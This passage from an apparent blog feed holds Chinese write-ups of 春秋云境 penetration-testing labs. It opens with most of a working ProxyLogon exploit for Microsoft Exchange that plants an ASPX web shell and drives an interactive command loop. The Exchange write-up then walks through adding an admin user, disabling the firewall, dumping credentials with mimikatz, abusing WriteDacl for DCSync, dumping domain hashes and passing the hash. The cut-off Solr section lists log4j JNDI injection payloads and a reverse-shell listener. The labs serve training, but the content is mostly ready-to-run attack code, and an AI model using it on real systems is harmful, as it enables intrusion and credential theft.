t=&quot;1&quot;&gt;S-1-5-2&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-11&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-15&lt;/s&gt;&lt;s a=&quot;3221225479&quot; t=&quot;1&quot;&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % sid</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;&quot;</span> % FQDN,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                data=proxyLogon_request,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">241</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="string">&quot;set-cookie&quot;</span> <span class="keyword">in</span> ct.headers:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Proxylogon Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            sess_id = ct.headers[<span class="string">&#x27;set-cookie&#x27;</span>].split(</span><br><span class="line">                <span class="string">&quot;ASP.NET_SessionId=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            msExchEcpCanary = ct.headers[<span class="string">&#x27;set-cookie&#x27;</span>].split(<span class="string">&quot;msExchEcpCanary=&quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got session id: &quot;</span> + sess_id)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got canary: &quot;</span> + msExchEcpCanary)</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="comment"># &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % (</span></span><br><span class="line">                <span class="comment"># FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Admin@&#123;server_name&#125;:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&amp;schema=VirtualDirectory&amp;msExchEcpCanary=&#123;msExchEcpCanary&#125;&amp;a=~1942062522; ASP.NET_SessionId=&#123;sess_id&#125;; msExchEcpCanary=&#123;msExchEcpCanary1&#125;&quot;</span>.</span><br><span class="line">                            <span class="built_in">format</span>(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id,</span><br><span class="line">                                    msExchEcpCanary=msExchEcpCanary),</span><br><span class="line">                            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line"></span><br><span class="line">                            &#125;,</span><br><span class="line">                            json=&#123;<span class="string">&quot;filter&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                                <span class="string">&quot;SelectedView&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;SelectedVDirType&quot;</span>: <span class="string">&quot;OAB&quot;</span>&#125;&#125;, <span class="string">&quot;sort&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">                            verify=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;GetOAB Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">            oabId = <span class="built_in">str</span>(ct.content).split(<span class="string">&#x27;&quot;RawIdentity&quot;:&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got OAB id: &quot;</span> + oabId)</span><br><span class="line"></span><br><span class="line">            oab_json = &#123;<span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: oabId&#125;,</span><br><span class="line">                        <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;ExternalUrl&quot;</span>: <span class="string">&quot;http://ffff/#%s&quot;</span> % shell_content&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (</span><br><span class="line">                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                json=oab_json,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Set external url Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            reset_oab_body = &#123;<span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: oabId&#125;,</span><br><span class="line">                            <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                                <span class="string">&quot;FilePathName&quot;</span>: shell_absolute_path&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (</span><br><span class="line">                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                json=reset_oab_body,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;写入shell失败&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">            shell_url = <span class="string">&quot;https://&quot;</span>+target+<span class="string">&quot;/owa/auth/test11.aspx&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功写入shell：&quot;</span> + shell_url)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;下面验证shell是否ok&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;code=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll());&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在请求shell&quot;</span>)</span><br><span class="line">            <span class="keyword">import</span> time</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            data = requests.post(shell_url, data=&#123;</span><br><span class="line">                                <span class="string">&quot;code&quot;</span>: <span class="string">&quot;Response.Write(new ActiveXObject(\&quot;WScript.Shell\&quot;).exec(\&quot;whoami\&quot;).StdOut.ReadAll());&quot;</span>&#125;, verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> data.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;写入shell失败&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;shell:&quot;</span>+data.text.split(<span class="string">&quot;OAB (Default Web Site)&quot;</span>)</span><br><span class="line">                    [<span class="number">0</span>].replace(<span class="string">&quot;Name                            : &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+]用户名: &#x27;</span>+ new_email)</span><br><span class="line">                final_shell = shell_url</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-]用户名: &#x27;</span>+new_email)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=============================&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> final_shell:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;下面启用交互式shell&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        input_cmd = <span class="built_in">input</span>(<span class="string">&quot;[#] command: &quot;</span>)</span><br><span class="line">        data=&#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;&quot;&quot;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c %s&quot;).stdout.readall())&quot;&quot;&quot;</span> % input_cmd&#125;</span><br><span class="line">        ct = requests.post(</span><br><span class="line">            final_shell,</span><br><span class="line">            data=data,verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> ct.status_code != <span class="number">200</span> <span class="keyword">or</span> <span class="string">&quot;OAB (Default Web Site)&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ct.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Failed to execute shell command&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shell_response = ct.text.split(</span><br><span class="line">                <span class="string">&quot;Name                            :&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(shell_response)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h3><p>使用工具<a href="https://github.com/hausec/ProxyLogon">proxylogon</a>,也可以使用<a href="https://github.com/herwonowr/exprolog">exprolog</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207145436.png"></p><p>拿到shell,且为system权限<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207145522.png"></p><p>添加用户方便操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user nihao9 nihao9! /add  </span><br><span class="line">net localgroup administrators nihao9 /add</span><br></pre></td></tr></table></figure><p>添加用户<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207145745.png"></p><p>远程桌面连接登录用户<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207145949.png"></p><p>查看administrator目录下的flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207150123.png"></p><p>远程端口 3389 没开的情况下使用的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#机器通过注册表修改允许远程访问的命令</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">#机器修改注册表开启3389端口</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br><span class="line">net stop TermService</span><br><span class="line">net start TermService</span><br><span class="line"></span><br><span class="line">#关掉防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>再查看用户时候看到还有一个Zhangtong的用户</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207150041.png"></p><p>使用mimikatz抓取密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207151305.png"></p><p>拿到的用户hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XIAORANG-EXC01$</span><br><span class="line">04a7efba490c30f2db51cd893d09a11d</span><br><span class="line">Zhangtong</span><br><span class="line">22c7f81993e96ac83ac2f3f1903de8b4</span><br></pre></td></tr></table></figure><p>上传个bloodhound分析域环境(需要上传到域机器上，或者上传到通过流量转发的机器上)，发现XIAORANG-EXC01$机器他对域内用户具有 WriteDacl</p><p>WriteDacl ：可写入目标 DACL，修改 DACL 访问权，即是说可以利用 WriteDacl 权限添加 Zhangtong 的 DCSync 权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :04a7efba490c30f2db51cd893d09a11d -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207153750.png"></p><p>如果命令执行不成功，如上图，下载<a href="https://raw.githubusercontent.com/byt3bl33d3r/CrackMapExec/master/cme/helpers/msada_guids.py">msada_guids.py</a>到&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket即可，</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207154431.png"></p><p>添加权限后，使用Zhangtong用户dump hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure><p>得到域管理员的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:6a049c17ae6f214d0ce0bb958be94c7a::: xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:33cd42e4c654333ef6118bea55f376ba::: xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131::: xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d::: xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f::: xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0::: xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21::: xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899::: xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66::: xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb::: xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102::: xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296::: Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4::: XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:b9df9852037915b5f26114769ace114a::: XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:b0d89dce8c89f4a43758961e8f782174::: XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:74d63202f94c220e09056568feafa894::: [*] Cleaning up...</span><br></pre></td></tr></table></figure><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>使用管理员hash，拿到管理员的shell,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207161108.png"><br>查看域管下的flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207161506.png"></p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>利用管理员hash使用smbexec横向到26这台机器后，发现没有flag<br>抓取的hash还看到了lumia的用户名，可以用域管理员创建一个本地管理员修改lumia的密码  ，然后登录桌面和邮箱查找信息,<br>我这里直接使用工具pthexchange把用户lumia的附件和邮件都下载了下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password &#x27;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#x27; --action Download</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207164928.png"></p><p>发现有个加密的压缩包<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207165245.png"><br>打开其他文件，发现压缩包密码是手机号<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207165338.png"></p><p>恰好有个手机号的文件<br>使用john爆破压缩包得到压缩包密码18763918468</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip2john secret.zip &gt;zip.txt</span><br><span class="line"></span><br><span class="line">john --wordlist=1.txt zip.txt解读代码</span><br></pre></td></tr></table></figure><p>解压文件得到flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207174203.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/Fvo1B5UbiqbENEe9uYrzJA">https://mp.weixin.qq.com/s/Fvo1B5UbiqbENEe9uYrzJA</a><br><a href="https://www.kinsomnia.cn/index.php/2024/03/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-exchange/">https://www.kinsomnia.cn/index.php/2024/03/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-exchange/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDBC </tag>
            
            <tag> Exchange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Certify</title>
      <link href="/2025/01/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/"/>
      <url>/2025/01/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/</url>
      
        <content type="html"><![CDATA[<h1 id="Certify"><a href="#Certify" class="headerlink" title="Certify"></a>Certify</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫描一下，扫描到了solr<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126155605.png"></p><p>Apache Solr 是一个开源的、基于 Java 的高性能搜索平台，用于对大型数据集进行全文搜索、结构化搜索和分析。</p><p>访问之后，solr版本是8.11.0，有个<a href="https://blog.csdn.net/weixin_45677119/article/details/111747307">CVE-2019-0193</a>，但没有利用成功；然后发现solr有log4j的组件，Solr log4j2 存在RCE，漏洞点如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/info?d=payload  #payload就是用来jndi注入的payload</span><br><span class="line">/solr/admin/cores?action=payload  </span><br><span class="line">/solr/admin/cores?_=1682346330230&amp;action=CREATE&amp;config=solrconfig.xml&amp;dataDir=data&amp;instanceDir=new_core&amp;name=payload&amp;schema=schema.xml&amp;wt=json  </span><br><span class="line">/solr/admin/collections?action=payload</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126160148.png"></p><h3 id="Solr-log4j2-RCE-漏洞测试"><a href="#Solr-log4j2-RCE-漏洞测试" class="headerlink" title="Solr log4j2 RCE 漏洞测试"></a>Solr log4j2 RCE 漏洞测试</h3><p>先使用burp抓包，利用dnslog测试是否存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://xxx.dnslog.cn&#125;#xxx.dnslog.cn在dnslog获取</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126160659.png"></p><p>发现dnslog有回显，说明payload成功执行，漏洞可以利用<br>不了解jndi的可以看<br><a href="https://xz.aliyun.com/news/11723">https://xz.aliyun.com/news/11723</a><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126160632.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在服务器上下载一个JNDIExploit-1.3,并用它开启一个ldap服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xxx.jar -i vpsip #1389，9999监听端口要开启</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250126172854.png"></p><p><code>nc -lvnp 9999</code> 开启监听，反弹shell<br><img 